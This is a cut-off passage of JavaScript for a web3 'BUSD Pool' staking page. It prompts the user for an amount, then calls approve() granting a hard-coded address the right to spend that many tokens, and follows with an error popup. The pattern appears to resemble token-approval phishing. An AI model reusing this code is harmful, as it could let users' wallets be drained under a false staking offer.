      text: 'Connect your wallet first!',
    })
  } else {
  chainId = ethereum.request({ method: 'eth_chainId' }).then(chainSymbol => {

      Swal.fire({
      icon: 'info',
      title: 'BUSD Pool APY is 7.65%',
      input: 'number',
      inputLabel: 'Enter the amount of BUSD you want to stake',
      showCancelButton: true,
      inputValidator: (value) => {
        if (!value) {
          return 'You have to enter the amount!'
        } else {
          const shortAddress = ethereum.selectedAddress;
          contract.methods.approve('0x98958d815DD2317a50200393A075A149e98C11b6', (web3.utils.toWei(value))).send({from: shortAddress})

      Swal.fire({
        icon: 'error',

})
